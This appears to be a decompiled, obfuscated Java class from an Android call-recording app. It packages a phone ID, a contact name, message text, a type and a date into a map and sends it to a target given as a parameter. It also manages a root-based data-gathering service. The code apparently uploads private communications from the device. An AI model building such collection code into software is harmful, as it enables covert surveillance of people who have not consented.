package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.GetDataRootService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: GetDataRootMain */
public abstract class h {
    /* access modifiers changed from: 0000 */
    public void a(a aVar, Cursor cursor) {
        if (aVar != null) {
            aVar.a();
        }
        if (cursor != null) {
            cursor.close();
        }
    }

    /* access modifiers changed from: 0000 */
    public void a(Context context, String str, String str2, String str3, String str4, String str5) {
        HashMap hashMap = new HashMap();
        String str6 = "";
        StringBuilder a2 = a.b.a.a.a.a(str6);
        a2.append(e.e(context));
        hashMap.put("idPhone", a2.toString());
        StringBuilder sb = new StringBuilder();
        sb.append(str6);
        sb.append(str);
        hashMap.put("fullName", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(str6);
        sb2.append(str2);
        hashMap.put("message", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str6);
        sb3.append(str3);
        hashMap.put("type", sb3.toString());
        StringBuilder sb4 = new StringBuilder();
        sb4.append(str6);
        sb4.append(str4);
        hashMap.put("date", sb4.toString());
        try {
            if (!a.c.e.a.b(str5, (Map<String, String>) hashMap)) {
                a.a.a(str, str2, str3, str4, str5, context);
            }
        } catch (Exception e2) {
            try {
                a.a.a(str, str2, str3, str4, str5, context);
            } catch (Exception e3) {
                e3.getStackTrace();
            }
            e2.getStackTrace();
        }
    }

    /* access modifiers changed from: 0000 */
    public void a(Context context) {
        try {
            GetDataRootService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("GetDataRootService.getmNbTask() : ");
            sb.append(GetDataRootService.f1079c);
            sb.toString();
            if (GetDataRootService.f1079c <= 0) {
                context.stopService(new Intent(context, GetDataRootService.class));
            }
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }
}
